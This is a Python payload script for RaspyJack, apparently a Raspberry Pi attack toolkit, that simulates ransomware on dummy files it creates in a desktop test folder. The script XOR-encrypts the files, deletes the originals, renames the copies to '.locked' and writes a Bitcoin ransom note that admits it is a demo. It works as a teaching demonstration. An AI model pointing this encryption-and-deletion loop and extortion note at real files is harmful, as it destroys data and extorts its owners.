#!/usr/bin/env python3
"""
RaspyJack *payload* – **Evil: Filesystem Encryptor (Ransomware Sim)**
======================================================================
A highly destructive payload that simulates a ransomware attack by
"encrypting" files in a target directory.

This script will:
1.  Create a test directory with some dummy files to encrypt.
2.  Traverse the directory and "encrypt" each file using a simple,
    reversible XOR operation.
3.  Rename the encrypted files to have a `.locked` extension.
4.  Create a ransom note file on the desktop.

**!!! EXTREME DANGER !!!**
This payload manipulates files. While it is designed to run only in a
sandboxed test directory, any modification or misuse could lead to
IRREVERSIBLE DATA LOSS. This is for educational demonstration of a
destructive attack ONLY. DO NOT run this on a real system.
"""

import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
# To prevent accidental damage, this only operates in a specific sandbox dir
SANDBOX_DIR = os.path.expanduser("~/Desktop/RANSOMWARE_TEST_FILES/")
RANSOM_NOTE_PATH = os.path.expanduser("~/Desktop/RANSOM_NOTE.txt")
XOR_KEY = 0xDE # Simple key for reversible encryption

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16, "KEY1": 21 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Main ---
def show_message(lines, color="red"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    y = 20
    for line in lines:
        d.text((5, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def setup_sandbox():
    show_message(["Creating test", "directory..."])
    os.makedirs(SANDBOX_DIR, exist_ok=True)
    # Create some dummy files
    with open(os.path.join(SANDBOX_DIR, "passwords.txt"), "w") as f: f.write("secret123")
    with open(os.path.join(SANDBOX_DIR, "project.docx"), "w") as f: f.write("important work")
    with open(os.path.join(SANDBOX_DIR, "photo.jpg"), "w") as f: f.write("a picture")
    time.sleep(1)

def run_encryption():
    show_message(["Encrypting files..."])
    encrypted_count = 0
    
    for filename in os.listdir(SANDBOX_DIR):
        filepath = os.path.join(SANDBOX_DIR, filename)
        if os.path.isfile(filepath) and not filename.endswith(".locked"):
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                
                encrypted_data = bytes([b ^ XOR_KEY for b in data])
                
                with open(filepath + ".locked", "wb") as f:
                    f.write(encrypted_data)
                
                os.remove(filepath)
                encrypted_count += 1
                show_message([f"Encrypting...", f"Files: {encrypted_count}"])
                time.sleep(0.5)
            except Exception as e:
                print(f"Could not encrypt {filepath}: {e}", file=sys.stderr)

    # Drop the ransom note
    ransom_note = """
Your files have been encrypted.
To get them back, you must pay 0.1 Bitcoin to the following address:
bc1q...

This was a demonstration. To decrypt your files, run the 'fs_decryptor.py' payload.
The key is 0xDE.
"""
    with open(RANSOM_NOTE_PATH, "w") as f:
        f.write(ransom_note)
        
    show_message([f"{encrypted_count} files", "encrypted!", "Ransom note", "on desktop."], "lime")


if __name__ == '__main__':
    try:
        show_message(["!!! DANGER !!!", "Ransomware Sim", "Press KEY1+OK", "to confirm."])
        
        # Require a two-button press to confirm
        start_wait = time.time()
        confirmed = False
        while time.time() - start_wait < 5.0:
            if GPIO.input(PINS["KEY3"]) == 0:
                show_message(["Aborted."])
                time.sleep(2)
                raise SystemExit
            # Check for simultaneous press of KEY1 and OK
            if GPIO.input(PINS["OK"]) == 0 and GPIO.input(PINS["KEY1"]) == 0:
                confirmed = True
                break
            time.sleep(0.1)
        
        if confirmed:
            setup_sandbox()
            run_encryption()
            time.sleep(5)
        else:
            show_message(["Confirmation", "not received.", "Aborting."])
            time.sleep(3)

    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Ransomware Simulator payload finished.")
